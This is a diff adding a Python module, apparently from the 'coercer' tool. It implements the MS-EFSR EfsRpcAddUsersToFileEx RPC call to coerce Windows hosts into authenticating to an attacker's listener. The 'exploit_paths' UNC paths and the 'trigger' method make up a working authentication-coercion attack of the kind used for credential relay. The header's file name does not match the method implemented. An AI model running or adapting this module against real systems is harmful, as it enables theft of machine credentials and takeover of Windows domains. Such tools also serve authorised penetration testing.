@@ -1,0 +1,120 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# File name          : EfsRpcOpenFileRaw.py
+# Author             : Podalirius (@podalirius_)
+# Date created       : 16 Sep 2022
+
+
+from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
+from coercer.network.DCERPCSessionError import DCERPCSessionError
+from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
+from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
+
+
+class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
+    align = 1
+    structure = (
+        ('Data', ':'),
+    )
+
+
+class EFS_RPC_BLOB(NDRSTRUCT):
+    structure = (
+        ('Data', DWORD),
+        ('cbData', PCHAR),
+    )
+
+
+class _EfsRpcAddUsersToFileEx(NDRCALL):
+    opnum = 15
+    structure = (
+        ('dwFlags', DWORD),    # Type: DWORD
+        ('Reserved', EFS_RPC_BLOB),   # Type: EFS_RPC_BLOB *
+        ('FileName', WSTR),    # Type: wchar_t *
+        ('EncryptionCertificates', ENCRYPTION_CERTIFICATE_LIST),  # Type: ENCRYPTION_CERTIFICATE_LIST *
+    )
+
+
+class _EfsRpcAddUsersToFileExResponse(NDRCALL):
+    structure = ()
+
+
+class EfsRpcAddUsersToFileEx(MSPROTOCOLRPCCALL):
+    """
+    
+    
+    https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/d36df703-edc9-4482-87b7-d05c7783d65e
+    """
+
+    exploit_paths = [
+        ("smb", '\\\\{{listener}}\\Share\\file.txt\x00'),
+        ("smb", '\\\\{{listener}}\\Share\\\x00'),
+        ("smb", '\\\\{{listener}}\\Share\x00'),
+    ]
+
+    access = {
+        "ncan_np": [
+            {
+                "namedpipe": r"\PIPE\efsrpc",
+                "uuid": "df1941c5-fe89-4e79-bf10-463657acf44d",
+                "version": "1.0"
+            },
+            {
+                "namedpipe": r"\PIPE\lsarpc",
+                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
+                "version": "1.0"
+            },
+            {
+                "namedpipe": r"\PIPE\samr",
+                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
+                "version": "1.0"
+            },
+            {
+                "namedpipe": r"\PIPE\lsass",
+                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
+                "version": "1.0"
+            },
+            {
+                "namedpipe": r"\PIPE\netlogon",
+                "uuid": "c681d488-d850-11d0-8c52-00c04fd90f7e",
+                "version": "1.0"
+            },
+        ]
+    }
+
+    protocol = {
+        "longname": "[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol",
+        "shortname": "MS-EFSR"
+    }
+
+    function = {
+        "name": "EfsRpcAddUsersToFileEx",
+        "opnum": 15,
+        "vulnerable_arguments": ["FileName"]
+    }
+
+    def trigger(self, dcerpc_session):
+        if dcerpc_session is not None:
+            try:
+                request = _EfsRpcAddUsersToFileEx()
+                # dwFlags: This MUST be set to a bitwise OR of 0 or more of the following flags.
+                # The descriptions of the flags are specified in the following table.
+                # If the EFSRPC_ADDUSERFLAG_REPLACE_DDF flag is used, then the EncryptionCertificates
+                # parameter MUST contain exactly one certificate.
+                EFSRPC_ADDUSERFLAG_ADD_POLICY_KEYTYPE = 0x00000002
+                EFSRPC_ADDUSERFLAG_REPLACE_DDF = 0x00000004
+                request['dwFlags'] = EFSRPC_ADDUSERFLAG_REPLACE_DDF
+                # Reserved: This parameter is not used. It MUST be set to NULL by the client and ignored by the server.
+                request['Reserved'] = EFS_RPC_BLOB()
+                # FileName: An EFSRPC identifier, as specified in section 2.2.1.
+                request['FileName'] = self.path
+                # EncryptionCertificates: A list of certificates, represented by an ENCRYPTION_CERTIFICATE_LIST structure,
+                # which are to be given access to the object.
+                request['EncryptionCertificates'] = ENCRYPTION_CERTIFICATE_LIST()
+                resp = dcerpc_session.request(request)
+                return ""
+            except Exception as err:
+                return err
+        else:
+            print("[!] Error: dce is None, you must call connect() first.")
+            return None
